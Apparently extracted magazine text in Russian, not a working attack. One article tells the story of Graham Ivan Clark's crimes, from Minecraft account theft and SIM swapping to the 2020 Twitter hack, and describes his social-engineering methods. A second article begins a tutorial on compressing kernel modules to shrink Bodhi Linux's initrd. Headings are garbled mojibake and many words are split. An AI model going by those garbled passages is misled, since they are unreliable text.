летний подросток в обязательной медицин-
ской маске на лице. Этот тихий паренек       Валентин Холмогоров                                                                               Ведущий редактор
поднял несколько миллионов баксов, начав          valentin@holmogorov.ru
с Minecraft, оказался замешан в убийстве,
а потом взло мал  Twitter-аккаунты Маска,
Обамы, Гейтса, Безоса, Байдена и других
знаменитос тей, на чем и попался. Вот его
исто рия.





                     Грэм Айвен Кларк на суде

В 14-лет нем возрасте Грэм Айвен Кларк был похож на многих своих сверс-
тников, живущих с мамой и редко вылеза ющих из-за клавиатуры — только
затем, что бы перекусить или схо дить в ненавистную школу. Пожалуй, от дру-
гих тиней дже ров его отличало лишь то, что Грэм в столь юном воз расте начал
зарабатывать весьма приличные деньги, играя в Minecraft, затем хак нул
известного финан систа и гла ву хедж-фонда, украв у него нес колько мил-
лионов дол ларов, а на десерт совершил взлом, который поз же наз вали
«самым круп ным инцидентом в истории Twitter». И все это — до того момента,
как ему исполни лось 18 и он стал совершенно летним по законам штата Фло-
рида, где парень родился и жил.


MINECRAFT

Minecraft Грэм Кларк увлекся в школе, а дома проводил за компом часы нап-
ролет, бегая по вымышленному миру вмес те с дру гими игро ками. Тогда же он
создал на YouTube канал, посвящен ный любимой игре, на котором надеялся
зарабо тать за счет монети зации. Несмотря на то что Грэм наб рал опре-
деленное количество постоянных подписчиков, серьезных доходов это не
при носило, и он решил нем ного расширить бизнес.
   Его YouTube-канал был пос вящен явлению, известному среди игроков
в Minecraft как hardcore factions. Так называют альянсы игроков, которые сов-
местно  могут  претендовать  на  опре делен ную  территорию,  работать
над стро ительством базы, налаживать взаимоотношения с дру гими фрак-
циями или, наоборот, вступать с ними в конфликты. Базы позволяют безопас-
но хранить добытые чле нами фракции игровые предметы. При этом участники
аль янса могут сражать ся с членами других фракций в надежде победить их,
чтобы затем совершить набег на вражескую базу и забрать цен ный лут.
  Грэм в основном пуб ликовал видео с «ловушками» — хит рыми способами
убийства других игро ков (некоторые из ловушек, как потом приз нали его зна-
комые, были постановочными, в связи с чем показан ные при емы невозможно
было при менить на практике).
  В ту пору необы чай ную популяр ность завоева ли чит-клиенты для PVP-
режима Minecraft: ставки были настолько высоки, что многие участники «хар-
дкорных фракций» вынужденно использовали PVP-читы, чтобы оставать ся
конкурен тоспо собными. Грэм начал рекламировать в своем канале подобные
программы, потом стал понемногу притор говывать ими сре ди своих зри-
телей.
  Сле дующий шаг на пути к успеху — распростра нение под видом чит-кли-
ентов разных инструментов удален ного админис трирования из категории
RAT, а также бэкдоров с целью воровс тва игровых акка унтов. Купля-продажа
чле нам хардкор ных фрак ций угнанных игровых учеток приносила значительно
боль ший доход, чем рек лама на YouTube.
  Знакомые с ним сверс тники вспоминают, что Грэм был очень общитель-
ным парнем и обла дал даром крас норечия, с помощью которого без особого
труда убеждал окружающих делать то, что ему надо. Например, манипулируя
людьми, он уговаривал их бесплатно помогать ему в создании роликов
для YouTube.
  Однажды 14-летний Кларк задумал запус тить собственный PVP-сер вер
Minecraft, однако ему недоставало для это го тех нических знаний. Тогда он
отыскал в интерне те нес кольких исполнителей для этой затеи и убе дил их
при соеди ниться к проекту, а ког да те выполнили всю необходимую работу,
без малейших зазрений совес ти кинул их.
  Примеча тельно, что, если кто-то из подписчи ков пытал ся разоблачить
Грэма, тот отно сился к этому абсолютно индиффе рентно. Ему было глубоко
плевать, что думают о нем окру жающие: Кларка инте ресо вал только биз нес.


ÊÒÎ ÕÎ×ÅÒ ÑÒÀÒÜ ÌÈËËÈÎÍÅÐÎÌ?

Зарабатывая на продаже угнанных игровых аккаунтов, Грэм втянулся в обще-
ние с зав сегдатаями хакерских форумов, торговавших украденными учет-
ными записями соци альных сетей и «красивы ми юзернеймами». Для добычи
таких уче ток использовались различные методы — соци альная инже нерия,
фишинг и распространение малвари.
   Кларк с искренним интересом принял ся изучать всю эту хакерскую кухню,
стремительно набираясь опы та у продвинутых форумчан. Больше все го его
заин тересовал при ем под названием SIM-свопинг, или подмена SIM-кар ты:
под этим понимается перенап равление всех вызовов и сообщений с номера
жертвы на телефон мошенника путем дублирования сим ки.
   Ут ром 15 апре ля 2019 года извес тный инвестор, финансист и основатель
хедж-фонда Грег Беннет неожи данно обнаружил, что его мобильный телефон
перестал при нимать звонки и SMS, да и вооб ще больше не видит сеть. Грег
не смог войти в свои акка унты в соци альных сетях или прочитать сообщения
элек тронной поч ты.
  Беннет тут же позвонил в службу технической поддержки сотово го опе-
рато ра — ком пании AT&T, но там ему сооб щили, что ничем не могут помочь:
его SIM-карта была перевыпущена и теперь подклю чена к другому мобиль-
ному телефону. Несколькими часами ранее кто-то зап росил сброс пароля
для элек тронного почтового ящика Бен нета, пра виль но отве тил на контроль-
ные воп росы, а затем, сменив пароль, зашел в личный кабинет на сай те
мобильного оператора и заказал новую сим ку.





                             Грег Бен нет

Зло умыш ленни ком, столь успешно выполнившим эту атаку, был Грэм Кларк
в ком пании c несколь кими сообщниками. Восполь зовавшись полученным
доступом, Кларк похитил со счета Грега Бен нета на Binance 100 биткоинов
и 64 альтко ина в виде различных токенов. На тот момент сумма ущер ба сос-
тавила 856 тысяч долларов США, а по сегодняшне му курсу стоимость
похищенного пре выси ла бы шесть миллионов долларов.
  После этого Грэм, по сви детельствам своих бывших школьных прияте лей,
«слетел с катушек». Он стал покупать дорогую дизайнерскую одежду, при-
обрел новенький белоснежный BMW и инкрустированные стразами часы
Rolex. Все это богатство и роскошь он выставлял напоказ в своем инстаг-
рам-аккаунте @error (сейчас этот аккаунт удален).
  На сче тах жертвы ограбления еще оставались деньги, и Кларк похитил бы
их тоже, однако Бен нет установил лимит на максимальную сумму опе раций.
Это его и спасло. Не сумев вывести средства, обурева емый жадностью Кларк
связался с Бен нетом и пред ложил ему вернуть доступ ко всем украденным
аккаунтам, если тот переведет ему оставшиеся 50 биткоинов. Беннет отка-
зался.
  Однако жадность не позволила Кларку тихо смыть ся с украденными день-
гами и залечь на дно: парень решил кинуть своих сооб щни ков, помогавших
ему взламывать поч ту Бен нета и обналичивать крип ту, не заплатив тем обе-
щанный процент. Кларк разом исчез из всех мессен джеров.
  Быв шие сооб щники даже попытались связаться с ним через взло манную
почту Беннета, обещая сдать Грэма полиции, если тот не выполнит свои обя-
зательства и не передаст им 66% похищенного. Они выяснили адрес,
по которо му 17-летний Кларк проживал с мамой, но не смогли застать его
дома. Тогда бывшие подельники решили слить кидалу копам.
  Ре зультатом  это го противостояния  ста ло  уго ловное  дело  и ордер
на обыск, с которым полицейские наг рянули домой к Кларку ранним августов-
ским утром 2019 года. Следователи кон фисковали у Грэма 15 тысяч дол ларов
наличными и 400 биткоинов на криптокошельке, что оказалось определенно
боль ше украденной у Грега Беннета суммы. Косвенно изъятое сви детель-
ствовало о том, что Кларк был замешан в каких-то иных финансовых махина-
циях.


ÓÁÈÉÑÒÂÎ

На время рас следования Кларк остался без денег и компьютера, но привычка
жить на широкую ногу не давала ему покоя. Поз же его знакомые рас сказыва-
ли, что в этот период парень при нялся за какие-то совсем уж темные делиш-
ки, вроде торговли зап рещенными вещес твами в даркне те.
  Во вре мя рождественских каникул, 4 янва ря 2020 года, в 19:30, к незапер-
тому черному входу в жилой ком плекс West Chase, расположенный в окру ге
Citrus Falls города Тампа, подъ ехал авто мобиль. Из него выбрались двое под-
ростков, один из которых был вооружен пистолетом.
  Мо лодые люди вош ли в здание. Позвонив в одну из квартир, подростки
что-то сказали находив шемуся там мужчине, пос ле чего тот достал ствол
и открыл огонь: один из визитеров был убит на месте, второго в критичес ком
состоянии доставили в больницу.
  Прибыв шие на место полицейские обна ружи ли на стоянке поблизости
от дома другой подозрительный авто мобиль, в котором находилось двое
перепуганных подростков. Одним из них ока зался Грэм Кларк, а застре лен-
ный парень, как выяснилось, был его приятелем.
  Позже сидевший в машине с Кларком молодой человек рассказал
полиции, что Грэм уго ворил сво их дру зей подняться в квартиру, где оби тал
драгдилер, и потребовать у него деньги, которые тот яко бы был ему должен.
Вроде бы поначалу Кларк даже отправил ся за приятелями следом «для подс-
траховки», но сразу же сбежал, заслышав выстре лы.
  Сам Грэм все отри цал, заявив детективам, что очутил ся рядом с местом
преступления совер шенно слу чай но.





И снова служители закона ничего не смогли доказать — из полицейских отче-
тов следовало, что дознавателям не удалось найти никаких под тверждений
при частнос ти Кларка к убийству. Его отпусти ли из участка ровно за два дня
до окон чания каникул, и Грэм как ни в чем не бывало вернулся в школу.
   Вскоре подоспели результаты вось мимесячного расследования по делу
об ограблении Грега Бен нета. Здесь все обви нения с Клар ка тоже были сня-
ты: из обнаруженных на его счетах 400 биткоинов парня заставили вернуть
Беннету 100. В то же время, несмотря на показа ния его бывших подельников,
ни на компе, ни в мобильном телефоне, ни в личной переписке Грэма сле-
дователи не обнаружили ни малей ших признаков причас тности парня
к каким-либо другим кибер прес туплениям.
  В результате достигнутого с про куратурой досудеб ного соглашения после
вып латы доброволь ной ком пенсации в отношении под ростка не стали выд-
вигать новых обвинений. Позже юристы пришли к выводу, что такая мягкость
и уступчивость про куратуры объ яснялась сложностя ми, свя занными с уголов-
ным преследова нием несовершенно лет него, да еще и в отсутствие стоп-
роцентных  доказательств  его  вины. Осталь ные изъ ятые деньги,  вклю-
чая 300 биткоинов, Клар ку с извинени ями вернули.


ÂÇËÎÌ ÂÅÊÀ

Ровно через восемь недель после того, как влас ти отдали Грэму Кларку боль-
шую часть изъято го у него ранее капитала и прекратили все связанные с ним
рас следования, он организовал взлом, названный жур налистами самым зна-
чительным инци дентом кибербезопасности за всю историю «Твит тера».
До 18-летия Клар ка оставалось чуть мень ше восьми месяцев.
   15 июля 2020 года в период между 20:00 и 22:00 часами по тихо океанско-
му вре мени в сети появились твиты от имени Илона Маска, Барака Обамы,
Бил ла Гейтса, Ким Кардашьян, Джеф фа Безоса, Джо Байдена и дру гих
селеб рити. В этих сооб щени ях зна мени тости обещали вер нуть в двойном
раз мере любую сумму в биткоинах, переведен ную на указанный криптокоше-
лек.
   Спустя счи таные минуты пользователи совершили более 250 транзакций
на общую сумму 118  тысяч долларов. Боль ше  у жуликов заработать
не получи лось, потому что круп ные криптобиржи быстро смекнули, в чем
дело, и занесли адрес мошеннического криптокошель ка в блек лист. Это пре-
дотвратило пос тупле ние на счет еще 280 тысяч дол ларов, которые отправили
скамерам доверчивые пользователи интернетов.
  В это же самое время в центральном офисе Twitter в Сан-Франциско сот-
рудни ки в панике пытались выяс нить, кому и каким образом удалось взло мать
социаль ную сеть, а глав ное, что теперь делать?





                   Один из легендарных тви тов

За 24 часа до это го на одном из хакер ских форумов появилось объявление
о продаже абсолют но любого зарегистри рованного аккаунта Twitter все го
лишь за 1000 долларов. Спе циалисты по кибер безопасности, обнаружив шие
этот тред, предположили, что за взломом звездных уче ток и махинацией
с биткоинами стоит автор данного сообщения. Его довольно быс тро вычис-
лили: зло деем оказался 19-летний парень из Великоб ритании Мей сон Шеп-
пард.
  Воз можно, имя зло умышленника так и оста лось бы неизвес тным, если бы
парнишка не решил выпендриться, пожелав сво ей девушке спо койной ночи
с угнанного твит тер-акка унта ее любимой кинозвезды. В этот момент к рас-
следованию взлома уже подклю чилось ФБР. Аген ты позвонили Шеп парду
и вежливо поинтересовались его нас троением, заод но попросив парня
надолго не отлу чать ся из дома, потому что за ним уже выехали.
  Ви димо, имен но в этот момент Шеппард наконец осознал, что шутки
закончились и в ближайшие несколько лет он будет строчить тви ты, сидя
на нарах в небольшом помещении с зарешеченным окном. Чтобы хоть как-то
повлиять на ситуацию, Мей сон сроч но связался с журналистами и принял ся
каяться, рассказывая им собственную историю со все ми леденящими душу
под робнос тями.
  За день до опи сываемых событий Мейсон Шеп пард поз накомился в «Дис-
корде» с таинственным человеком по имени Кирк. Тот представился большим
бос сом из ком пании Twitter и доверительно сообщил, что име ет неограничен-
ный доступ  ко всем  пользовательским  акка унтам, продемонс трировав
в качес тве пруфа несколько скриншотов админки социальной сети. Шеп пард
и еще один пользователь, Нима Фазели под ником Rolex, конечно же,
не повери ли новому знакомому и потребова ли более вес ких доказательств.
Кирк незамедлительно предос тавил их, отпра вив условленные твиты с ука-
занных Шеп пардом и Фазели акка унтов.
  Почувство вав запах легких миллионов, троица тут же задумала стартап:
Мейсон и Фазели станут продавать учетки с красивыми име нами на хакерских
форумах, делясь при былью с Кирком, а тот бесплатно выдаст им некоторое
количество аккаунтов в качестве комиссии для будущей перепродажи.





          Мейсон Шеп пард (слева) и Нима Фазели (справа)

Однако бизнес не пошел. Прошаренные обитатели даркне та не поверили
в нелепую исто рию про сот рудни ка Twitter и не спешили покупать акка унты
за тысячу долларов, пребывая в уверенности: товар ворованный, а значит,
законные владельцы учеток имеют неплохие шан сы вернуть их себе в самом
бли жайшем будущем.
   Кирк тоже понимал, что взлом социальной сети очень скоро будет обна-
ружен и времени у него оста лось очень-очень мало. В итоге он плюнул
на своих новоявленных деловых партне ров и самолично запус тил скам
с «удвоением биткоинов», результатом которого стал небыва лый шум в прес-
се, буря в новостях и подклю чение к гром кому рас следованию суровых аген-
тов ФБР.
  Под псев донимом Кирк выступал Грэм Кларк и его ано нимный 15-летний
при ятель по киберкриминальным делам, который учас твовал вмес те с Грэ-
мом еще в бизнесе по под мене SIM-карт. Этот юный парнишка, которому
в силу его нежного возраста не были предъявле ны никакие пуб личные обви-
нения, оказался намного более прод винутым в техничес ких вопросах, чем
сам Кларк. Парень засветился на хакер ских бордах в 13-летнем возрасте
и даже, по слухам, участвовал в одном из успешных взломов портала
GoDaddy.
  В 2020 году на нашей грешной пла нете разразилась эпи демия корона-
вирусной инфекции, многие ком пании ста ли экстрен но переводить сотрудни-
ков на удаленную работу. Механизмы авториза ции и протоко лы безопасности
еще не были тол ком отла жены. Не исклю чением в этом списке стала и ком-
пания Twitter. Кларк и его 15-летний друг решили воспользоваться сложив-
шейся ситуацией.
  Для начала они отправились в LinkedIn и составили перечень всех сот-
рудни ков Twitter, которых сумели там найти. Затем, зарегистрировав платный
аккаунт с возможностями подбора персонала, ребята получили доступ
к телефонным номерам этих людей. Юные жулики ста ли зво нить по соб-
ранным номерам, представляясь сот рудни ками техничес кого департамента
Twitter.
   Кларк, у которого был более взрос лый голос и хорошо под вешенный язык,
забалтывал потенциальных жертв, сооб щая, что у адми нов ком пании воз-
никли проблемы с их учетной записью, поэтому следует заново авторизовать-
ся  на  кор поративном портале по ссылке,  которая,  разумеется,  вела
на фишин говую веб-стра ницу.
  Получив таким обра зом доступ к корпоратив ному порталу Twitter, Кларк
при нялся искать сот рудников, имеющих в компании выс шие кор поративные
при виле гии, и начал ата ковать подоб ным обра зом уже их. И 14 июля один
из адми нистра торов, имев ших дос туп к панели управления аккаунтами Twitter,
попал ся в заботливо рас ставленные сети. С это го момента Кларк получил
пол ный дос туп ко всем учетным записям пользователей социальной сети.
Пос ле это го он и объявился в «Дискорде» под именем Кирк.
   У агентов ФБР ушло две недели на то, чтобы раскрутить всю эту цепочку
событий. 31 июля 2020 года Грэм Кларк был арестован. За этим пос ледова ли
аресты Мей сона и Нимы — как оказалось, оба незадачливых «пред принима-
теля»  исполь зовали  для  регистрации  на  «Бинансе»  свои  настоящие
водительские права и телефонные номера, а затем выводили заработанную
на продаже угнанных аккаунтов крип ту через эти акка унты.
  По законам США 19-летнему Мейсону за соучастие во взломе, мошен-
ничестве и про даже краденых уче ток грозило до 45 лет тюремного зак-
лючения. Ниму Фазели обви няли все го лишь в пособничес тве и подс тре-
кательстве к незаконному доступу к компьютерным системам, за что по аме-
риканским законам полагается до пяти лет тюремного заключения и штраф
в размере до 250 тысяч долларов США.
  В итоге  экстрадиро ванный из Англии в Аме рику Шеппард получил
от федерального судьи пять лет тюрь мы, Фазели и вовсе отделал ся условным
сро ком  и  штрафом,  заключив  сделку  со  следствием.  Для Мейсона
это наказание можно считать довольно суровым, особенно с учетом того, что
Кларк фактически обманом использовал их с Фазели, являясь организатором
и вдохновите лем преступления.
   Что же касается самого Кларка, то ему снова удалось выйти сухим
из воды. Поскольку на момент совершения преступления Грэм был несовер-
шенно летним, его дело рассматривалось в особом поряд ке. Кларк приз нал
вину, раскаялся и получил три года тюремного заключения. Очень гуман но,
учитывая его роль во всей этой истории.


ÏÎÑËÅÑËÎÂÈÅ

Под ростки  и  есть  под ростки. Имея  неог раниченный  доступ  ко всем
без исключения поль зовательским акка унтам Twitter, Грэм Айвен Кларк мог
обрушить рынок акций и зарабо тать на этом миллиарды дол ларов. Он был
в сос тоянии обвалить капитализацию Apple, Microsoft и Amazon. Обладая
доступом к учеткам мировых полити ков и конгрессме нов, он, вероятно, даже
имел возможность начать третью мировую войну. Вместо этого Кларк со сво-
им малолетним подельником устро ил наивный скам на сот ню тысяч баксов,
да и те не сумел пус тить в дело, пос коль ку служба безопасности криптобиржи
правиль но оценила ситуацию и быстро заб локировала все подозрительные
транзакции.
  Впрочем, суд над Клар ком тоже превратился в фор менную комедию —
Голливуд обзавидуется. Посколь ку пан демия была еще в самом разгаре,
судебные заседания про водились в Zoom. Узнав об этом, оби тате ли хакер-
ских борд стали под ключать ся к трансляциям, представляясь журналистами
и сотрудни ками информацион ных агентств. В резуль тате выступления про-
курора и пре ния сторон периоди чески пре рывались собачьим лаем и неп-
ристойными звуками. В кон це концов кто-то сумел захватить экран и развлек
при сутствующих задорным порнографическим видеороликом.
  Судеб ные приставы банили  хулиганов со  скоростью света, но  это
не помогало: на связь пос тоянно выходили новые. Тем не менее суд завер-
шился, и Кларк услы шал свой при говор. Если бы Грэм был взрослым,
по совокупности предъявленных обвинений из 30 пунктов он мог загреметь
за решетку на 210 лет. Все го лишь три года тюремного заключения звучали
как оправдательный при говор. Кста ти, этот срок как раз скоро закончится.
  Нес мотря на то, что Грэм доброволь но отдал влас тям все добытые в ходе
ата ки на Twitter день ги, осуж денному оста вили накоп ленные им ранее бит-
коины (доказать кри минальное происхождение этих накоплений у суда так
и не получилось) — их стоимость на момент выхода Грэма из тюрь мы сос-
тавила уже 12 миллионов долларов. Неплохой бонус для вче рашнего школь-
ника.
  Навер ное, человечеству повезло, что этот «взлом века» организовал
не умуд ренный опы том, седой и цинич ный хакер, а простой паренек из Там-
пы, который просто хотел заработать немного денег на новые часы с блес-
тяшка ми. Иначе последствия могли быть куда более печальными.
ТРЮКИ





В этой статье я покажу, как пересобрать
Bodhi Linux 7.0 для снижения тре бований
к опе ратив ной памяти на эта пе загрузки
в демонстра ционном режиме или при уста-
нов ке. При этом функциональность совер-         Игорь Орещенков                                                                                                   r0bur@mail.ru
шенно не пострадает. Ты найдешь здесь
два  сце нария  обо лочки,  с  помощью
которых смо жешь сде лать то же самое
с другими дистрибути вами, осно ван ными
на Ubuntu 22.04 LTS. А в про цессе узна ешь
мно го интересного о Linux.


ÈÇ-ÇÀ ×ÅÃÎ ÂÅÑÜ ÑÛÐ-ÁÎÐ?

При рода не терпит пустоты. Носители информации, хоть их емкость тоже рас-
тет семимильными шагами, не справляют ся с лавиной данных, которая на них
обрушивается.
  В кон це девяностых компьютер с 32 Мбайт оперативной памяти и дис ком
на 3,2 Гбайт был типичным инструментом офисного работника и мечтой сту-
дента. Сегод ня  труд но удивить компьюте ром,  характерис тики которого
в 1000 раз выше, но который по-прежнему работа ет на пре деле своих воз-
можнос тей.
   Частично это объясня ется новым уровнем слож ности решаемых задач,
но иногда встре чают ся ограничения, которым трудно най ти оправдание.
   Чуть больше года назад в статье «Linux на диете. Уменьшаем требования
Bodhi Linux к опе ративной памяти» я описал проб лему некоторых дистрибути-
вов: при загрузке Linux использует минимальную файловую сис тему (МФС),
сжатый образ которой заг ружа ется в оперативную память, в ней же разжима-
ется, пос ле чего еще копируется в начальную кор невую файловую сис тему,
тоже хранящуюся в оперативной памяти. И для всей этой акро батики памяти
требуется боль ше, чем для обыч ной работы операци онной системы.




                        Ramfs, rootfs and initramfs



Больше все го памяти занимают драйверы устройств (преимущес твенно —
сетевых и виде оадап теров) и двоичные фай лы, используемые ими (мик-
ропрограммы и про шивки).
  Исключив эти компонен ты из МФС, можно установить Bodhi Linux 6.0,
основанный на Ubuntu 20.04 LTS, на компьютер с 512 Мбайт ОЗУ (тогда
как изна чально тре бовалось 768 Мбайт). Ты потеря ешь только ани мирован-
ную заставку и возможность загрузки по сети. Некритично, но правильное
решение проблемы по Альтшуллеру должно сохранять функциональ ность
системы как минимум в объеме первоначального замыс ла.
  Тем вре менем плохо поддающееся контролю распухание образа МФС
набирает обо роты с выходом новых устройств: нужны все новые и новые
драйверы для их под держки. Новой вер сии Bodhi Linux 7.0, которая основана
на Ubuntu 22.04 LTS, для загрузки с офи циального дистрибутивного носите ля
уже не хватает 768 Мбайт! Ничего удивитель ного: суммарные требования
к опе ратив ной памяти при подготовке МФС casper/initrd.gz теперь сос-
тавляют 111 Мбайт + 340 Мбайт + 346 Мбайт = 797 Мбайт.





Эта угрожающая тен денция привлекла внимание чле нов сообщества Ubuntu,
и результаты проведенных ими изысканий внед рены в пос леднем на данный
момент выпуске — Ubuntu 23.10. В это непросто поверить, но Ubuntu 23.10
Server стартует с дис трибутивного носителя на сис теме с 384 Мбайт ОЗУ.
Как удалось дос тичь столь потряса ющего резуль тата?


È ÊÀÊ ÝÒÎ ÍÎÑßÒ ÒÅÏÅÐÜ?

Разработ чики руководство вались тремя желаниями:
 • из бавить ся от ошиб ки «error: out of memory» на начальном этапе загрузки
   опе рационной системы;
 • уменьшить размер заг рузочного раздела /boot;
 • ускорить загрузку опе раци онной системы.

Ис сле дователи быстро пришли к выводу, что клю чевую роль тут играет МФС,
а именно ее размер и способ ком понов ки. Свойства алго ритма сжатия осо-
бенно замет ны на малоп роизводитель ных системах с ограниченным объ-
емом оператив ной памяти. В пос тавках Ubuntu, начиная с версии 22.04,
для компрессии начальной корневой фай ловой системы initramfs исполь-
зовался метод zstd -1, поскольку zstd -19 оказался слишком мед ленным
для некоторых вычислительных систем. Таким обра зом, обна руживается про-
тиворечие: сжатие полезно для того, что бы снизить тре бова ния к объему
памяти и хранили ща информа ции, но вредит быс трой заг рузке сис темы.




                      Reduce initramfs size and speed up the generation
                               in Ubuntu 23.10


Что бы разрешить это противоречие, раз работчики пред ложили сжимать
не всю МФС как единицу хранения, а входящие в нее файлы модулей ядра
с драй верами устройств и с исполь зуемы ми ими двоичны ми данными, каж-
дый по отдельнос ти. В пользу такого решения говорят сле дующие аргументы.
Для работы кон кретной платформы нужны лишь нес колько драйверов из того
обширного набора, который поставляется в составе дистрибутива. При заг-
рузке опе раци онной системы будут востре бова ны и потребуют распаковки
лишь несколько фай лов из состава МФС, а осталь ные будут храниться в ком-
пак тной фор ме на случай изменения конфигура ции. К тому же для сжатия
можно вос пользоваться более ресурсоем ким и эффективным методом ком-
прессии, потому что эта про цеду ра выполняется однократно, а один раз мож-
но и подож дать.
  Мо дифициро ванный вари ант компоновки образа МФС casper/initrd.
zst для дис трибутива Bodhi Linux 7.0 тре бует в оперативной памяти 97 Мбайт
+ 47 Мбайт + 126 Мбайт = 270 Мбайт.





Те перь initrd состоит не из трех, а из четырех час тей. Первые две — как и
раньше — бинарные бло ки с микрокодами для про цессоров AMD и Intel,
помещенные в нес жатые архи вы cpio. А вот следом за ними теперь идет
еще один несжатый архив cpio, который содер жит предварительно сжатые
файлы с модулями ядра и дво ичны ми данными драйверов устройств. Зак-
лючительная часть представляет собой сжа тый архив cpio с той частью МФС,
которая осталась пос ле выноса из нее модулей ядра и файлов rmware.
   Благодаря тому что размер сжа той части сущес твенно уменьшил ся, для ее
рас паковки стало требовать ся мень ше буферной опе ративной памяти. При-
мене ние к модулям ядра и фай лам rmware более эффективного метода сжа-
тия спо собствовало, помимо прочего, уменьшению размера фай ла  initrd.
Как результат — снижение требований к опе ративной памяти на этапе заг-
рузки с пол ным сохранением функци ональнос ти, что наглядно демонстри-
руется дистри бутив ными носителями Ubuntu 23.10.




Ты, наверное, знаешь, что содержимое ISO-образов удоб но просматри вать
с помощью фай лового менед жера 7zFM.exe из пос тавки архивато ра 7-Zip.
Но его же мож но использовать для ана лиза содер жимого образов МФС.
Надо только выб рать файл initrd и воспользоваться пунктом меню «Файл —
Открыть внутри #». Тог да на панели отобразится перечень его составных час-
тей, каждую из которых мож но открыть как обыч но, нажав Enter.





  Анализ содержимого фай ла initrd с помощью файлового менед -
  жера 7zFM.exe



Ес тественно, все описанное про изош ло не само собой, а пот ребовало уси-
лий от разработчиков дистри бутива. Во-первых, для сжатия файлов с модуля-
ми ядра при его сборке в конфигурации должны при сутство вать следующие
парамет ры:


# CONFIG_MODULE_COMPRESS_NONE is not set
CONFIG_MODULE_COMPRESS_ZSTD= Y

Во-вто рых, для обес печения подгрузки сжа тых бинар ных файлов rmware
конфигурация ядра должна вклю чать такие параметры:


CONFIG_FW_LOADER_PAGED_BUF= Y
CONFIG_FW_LOADER_COMPRESS= Y
CONFIG_FW_LOADER_COMPRESS_ZSTD= Y

В-третьих, под держка этой технологии должна быть реали зована в сце нарии
из initramfs-tools, который формиру ет образ МФС.
  Остается толь ко порадовать ся за счастли вых обладателей Ubuntu 23.10,
которые получили все перечисленные доработки прямо «из короб ки». Но как
быть тем, кто пред почитает стабильность и ориентирует ся на LTS-дистри-
бути вы с длительным временем поддержки? Ждать следующе го выпуска?
Прак тика показывает, что в случае Bodhi Linux это может затянуться на долгие
годы... А давай попробу ем дорабо тать дис трибутив сво ими силами! В конце
концов, тот, кто сам пилит свои дрова, согревается дважды. Путь намечен,
осталось сде лать первый шаг. Как там у классиков? «Вижу цель, не вижу пре-
пятс твий!..»


×ÒÎ Ó ÍÀÑ Ñ ßÄÐÎÌ?

Итак, для работы механизмов сжатия фай лов модулей и rmware тре буется
под держка на уровне ядра. За чем же дело стало? Загружа ем исходни ки,
выставляем нужные опции, запус каем сборку и идем пить кофе. Так-то оно
так, но есть нюанс.
   Во-первых, с заменой ядра придется модифицировать и состав основной
файловой  системы  дистри бутива,  находя щейся  в  файле  casper/
filesystem.squashfs. Во-вто рых, Canonical как издатель Ubuntu под писыва-
ет свои ядра электронной цифровой под писью, что позволяет загружать эту
операци онную систему на компьюте рах с EFI без отключения настройки
безопасной заг рузки Secure Boot. В общем, чтобы не делать лишнюю работу
и не оказать ся у раз битого корыта, лучше будет восполь зовать ся штатным
ядром дистрибути ва, если, конечно, оно будет делать то, что нам нужно.
  Проще все го  узнать конфигура цию ядра из конфига, находящегося
в каталоге /boot уста новленной операционной сис темы. Для ядра 5.15.0-
78 интересующие нас параметры выг лядят так:


CONFIG_MODULE_COMPRESS_NONE= y
# CONFIG_MODULE_COMPRESS_GZIP is not set
# CONFIG_MODULE_COMPRESS_XZ is not set
# CONFIG_MODULE_COMPRESS_ZSTD is not set
…
CONFIG_FW_LOADER_PAGED_BUF= y
CONFIG_FW_LOADER_COMPRESS= y

Первый блок параметров наводит на мысль, что с имеющим ся ядром ничего
пут ного не вый дет, ведь сжатие модулей отклю чено. На самом деле рано
отча иваться.  Я, нап ример, и не пла ниро вал пересобирать все модули
из  исходных  текстов.  Ведь можно самому  сжать имеющиеся файлы
с помощью соответс твующих ути лит. По крайней мере, стоит попробовать.
  Со вторым блоком, на первый взгляд, все в поряд ке... Хотя постой, а где
параметр CONFIG_FW_LOADER_COMPRESS_ZSTD?.. А его-то и нет! Потому что
сжатие rmware по алгоритму zstd было добавлено в ядро с версии 5.19, а до
этого подразумевалось использование алго ритма xz. Можно ска зать, что нам
и так повезло, потому что до версии 5.3 ядро вообще не умело работать
со сжатыми бинарными фай лами поддержки аппа ратуры.
  В целом увиденное обна деживает. Мож но приступать к натурным испы-
таниям на све жей установке Bodhi Linux 7.0.


ÒÐÅÍÈÐÎÂÊÀ ÍÀ ÌÎÄÓËßÕ ßÄÐÀ

Я решил начать со сжатия модулей ядра. В качестве подопытного был выб ран
драйвер фиктивного сетевого адаптера dummy.ko, который не включен
в авто загрузку и некритичен для работы операционной системы. Но перед
началом экспе риментов я все-таки соз дал его резервную копию в домашнем
катало ге:


TESTMODULE=/usr/lib/modules/5.15.0-78-generic/kernel/drivers/net/
dummy.ko
cp $TESTMODULE ~/dummy.ko.bak

Затем произвел сжа тие файла модуля с помощью утилиты xz:


sudo xz -C crc32 $TESTMODULE

Пос ле запуска xz результат сжатия оказал ся в файле с рас ширени ем .xz,
а исходный файл был удален:



  $ ls -l $TESTMODULE $TESTMODULE.xz
  ls: невозможно получить доступ к '/usr/lib/modules/5.15.0-78-
  generic/kernel/drivers/net/dummy.ko':
  Нет такого файла или каталога
  /usr/lib/modules/5.15.0-78-generic/kernel/drivers/net/dummy.ko.xz


По ка что все идет по плану. Я еще раньше пос мотрел, что в initrd от Ubuntu
23.10 фай лы сжатых модулей имеют рас ширение .zst, так что это нормаль-
но. Наступил момент истины — попробуем заг рузить сжатый модуль ядра:



  $ sudo modprobe dummy
  modprobe: ERROR: could not insert 'dummy': Unknown symbol in module,
  or unknown parameter (see dmesg)


Раз ERROR, значит, ничего хорошего... Неуже ли ничего не получит ся? Стоп!
Имя модуля изме нилось, а зависи мости-то мы обновить забыли? Исправ-
ляем оплошность:


sudo depmod -a

Пос ле это го команда загрузки драй вера dummy отрабаты вает молча, а это
хороший признак. Про веря ем:



  $ lsmod | grep ^dummy
  dummy   16384  0


Так и есть, сжа тый модуль загрузился. Это уже полови на успеха! Можно
выдох нуть и выг рузить модуль:


sudo modprobe -r dummy

Но мы исполь зовали xz-ком прессию, а в Ubuntu 23.10 применяют алгоритм
zstd. Наше ядро не поддержи вает zstd-сжатие двоичных файлов прошивок,
однако про модули с определенностью пока ничего ска зать нель зя. А давай
вос становим файл модуля и поп робуем zstd!


sudo unxz $TESTMODULE .xz
sudo zstd -19 $TESTMODULE -o $TESTMODULE .zst
sudo rm $TESTMODULE
sudo depmod -a

Сделано. Проверяем:



  $ sudo modprobe dummy
  $ lsmod | grep ^dummy
  dummy   16384  0
